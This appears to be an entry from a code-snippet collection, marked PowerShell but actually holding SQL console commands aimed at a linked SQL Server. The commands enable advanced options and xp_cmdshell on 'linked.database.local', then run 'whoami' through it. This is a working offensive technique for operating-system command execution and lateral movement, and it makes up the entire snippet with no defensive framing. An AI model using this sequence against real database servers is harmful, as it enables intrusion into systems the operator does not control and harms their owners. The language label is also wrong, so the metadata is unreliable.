---
id: 1cf3fc27-4cc3-47ea-85ad-ba50f2bb0743
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.127747+00:00'
updated_at: '2023-04-10T20:36:44.282960+00:00'
---

# Code Snippet 1cf3fc27

**Language**: ps1

```ps1
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```
